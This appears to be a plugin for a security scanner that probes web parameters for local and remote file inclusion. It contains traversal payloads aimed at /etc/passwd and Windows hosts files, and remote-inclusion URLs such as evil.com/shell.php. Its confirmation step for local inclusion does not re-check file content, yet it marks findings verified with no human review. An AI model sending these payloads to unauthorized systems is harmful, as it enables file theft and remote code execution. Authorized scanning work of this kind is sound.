#!/usr/bin/env python3
"""Evidence-oriented LFI/RFI detector for authorized targets.
Distinguishes between application errors and actual file inclusion.
"""
import re
from typing import Dict
from core.context import Context
from plugins._request_helpers import request_param

# Local File Inclusion payloads
LFI_PAYLOADS = [
    '../../../../etc/passwd',
    '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '/etc/passwd',
    'C:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts',
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2f..%2fetc%2fpasswd',
]

# Remote File Inclusion payloads
RFI_PAYLOADS = [
    'http://evil.com/shell.php',
    'http://attacker.com/payload.jpg',
    'http://localhost/evil.txt',
    'https://gist.githubusercontent.com/test/raw/payload'
]

# File signatures
FILE_PATTERNS = [
    re.compile(r'^root:x:0:0:', re.I | re.M),
    re.compile(r'127\.0\.0\.1\s+localhost', re.I),
    re.compile(r'^\s*\[drivers\]\s*$', re.I | re.M),
    re.compile(r'# Copyright.*Microsoft', re.I),
]

# RFI indicators - distinguish actual inclusion from error
RFI_INDICATORS = [
    re.compile(r'<?php', re.I),
    re.compile(r'eval\s*\(', re.I),
    re.compile(r'system\s*\(', re.I),
    re.compile(r'passthru\s*\(', re.I),
    re.compile(r'base64_decode', re.I),
    re.compile(r'GET\s*\.+\s*\$_', re.I),
]

# Application error patterns (NOT actual inclusion)
ERROR_PATTERNS = [
    re.compile(r'failed to open stream', re.I),
    re.compile(r'include\(\)', re.I),
    re.compile(r'Warning\s*:', re.I),
    re.compile(r'Error\s*:', re.I),
    re.compile(r'Unable to', re.I),
    re.compile(r'not found', re.I),
]

def _check_error_response(text: str) -> bool:
    """Check if response is just an application error, not actual file content."""
    return any(p.search(text) for p in ERROR_PATTERNS) if text else False

def _check_file_content(text: str) -> tuple:
    """Check if response contains actual file content vs error messages."""
    has_file_sig = any(p.search(text) for p in FILE_PATTERNS) if text else False
    has_error = _check_error_response(text)
    return has_file_sig, has_error

def _check_rfi_indicators(text: str) -> bool:
    """Check for RFI code execution indicators."""
    return any(p.search(text) for p in RFI_INDICATORS) if text else False

def run(ctx: Context) -> Dict:
    target = ctx.target
    findings = []
    params = ctx.get('discovered_params', []) or [
        {'url': target, 'param': 'file', 'method': 'GET'},
        {'url': target, 'param': 'page', 'method': 'GET'},
        {'url': target, 'param': 'include', 'method': 'GET'},
        {'url': target, 'param': 'path', 'method': 'GET'},
        {'url': target, 'param': 'doc', 'method': 'GET'},
    ]
    
    ctx.log('info', f'Iniciando detección LFI/RFI en {target}')
    
    for info in params[:10]:
        if ctx.stopped:
            break
        param = str(info.get('param') or '')
        if not param:
            continue
        
        try:
            baseline = request_param(ctx, info, str(info.get('baseline_value') or 'test'), timeout=8)
            baseline_text = getattr(baseline, 'text', '') or ''
        except Exception:
            baseline_text = ''
        
        # Test LFI payloads
        for payload in LFI_PAYLOADS:
            if ctx.stopped:
                break
            try:
                resp = request_param(ctx, info, payload, timeout=8)
                text = getattr(resp, 'text', '') or ''
                # Diferencial obligatorio: sin cambio frente al baseline no hay hallazgo.
                try:
                    from difflib import SequenceMatcher as _SM
                    if baseline_text and _SM(None, baseline_text[:8000], text[:8000]).ratio() >= 0.98 and len(text) == len(baseline_text):
                        continue
                except Exception:
                    if text == baseline_text:
                        continue
                
                # Skip if just an error message
                if _check_error_response(text):
                    continue
                
                has_file_sig, has_error = _check_file_content(text)
                
                if has_file_sig and not has_error:
                    # Confirm with second request
                    confirm = request_param(ctx, info, payload, timeout=8)
                    confirm_text = getattr(confirm, 'text', '') or ''
                    
                    if has_file_sig and not _check_error_response(confirm_text):
                        url = getattr(resp, 'url', None) or info.get('url', target)
                        findings.append({
                            'type': 'lfi', 'severity': 'high', 'title': 'Local File Inclusion',
                            'detail': f'Lectura reproducible de archivos locales mediante el parámetro "{param}".',
                            'confidence': 0.99,
                            'verification_state': 'VERIFIED',
                            'requires_human_review': False,
                            'evidence': {
                                'url': str(url), 'parameter': param, 'method': str(info.get('method', 'GET')).upper(),
                                'payload': payload, 'matched': 'file_signature', 'reproduced': True,
                                'baseline_status': getattr(baseline, 'status_code', 0),
                                'response_size': len(text),
                                'indicators': ['file_content_detected', 'no_error_indicators']
                            },
                            'url': str(url), 'parameter': param, 'payload': payload,
                        })
                        ctx.log('ok', f'LFI confirmado en {param}')
                        break
                        
            except (TimeoutError, ConnectionError, RuntimeError):
                ctx.log('debug', f'LFI {param}: timeout/connection error')
            except Exception as exc:
                ctx.log('warn', f'LFI {param}: {exc}')
        
        # Test RFI payloads
        if ctx.stopped:
            break
        for payload in RFI_PAYLOADS:
            if ctx.stopped:
                break
            try:
                resp = request_param(ctx, info, payload, timeout=8)
                text = getattr(resp, 'text', '') or ''
                
                # Skip if just an error message (not actual inclusion)
                if _check_error_response(text):
                    continue
                
                # Check for actual RFI indicators
                rfi_indicators = _check_rfi_indicators(text)
                
                if rfi_indicators:
                    # Confirm
                    confirm = request_param(ctx, info, payload, timeout=8)
                    confirm_text = getattr(confirm, 'text', '') or ''
                    
                    if _check_rfi_indicators(confirm_text):
                        url = getattr(resp, 'url', None) or info.get('url', target)
                        findings.append({
                            'type': 'rfi', 'severity': 'critical', 'title': 'Remote File Inclusion (RFI)',
                            'detail': f'Inclusión de archivo remoto confirmada en {param}. El servidor está ejecutando código externo.',
                            'confidence': 0.95,
                            'evidence': {
                                'url': str(url), 'parameter': param, 'method': str(info.get('method', 'GET')).upper(),
                                'payload': payload, 'type': 'code_execution',
                                'indicators_found': ['code_execution_detected'],
                                'confirmation': True
                            },
                            'url': str(url), 'parameter': param, 'payload': payload,
                        })
                        ctx.log('ok', f'RFI confirmado en {param}')
                        break
                        
            except (TimeoutError, ConnectionError, RuntimeError):
                ctx.log('debug', f'RFI {param}: timeout/connection error')
            except Exception as exc:
                ctx.log('warn', f'RFI {param}: {exc}')
    
    return {'findings': findings}

__version__ = '2.0.0'; __author__ = 'HT Team'; PHASE = 'attack'; REQUIRES = ['crawler']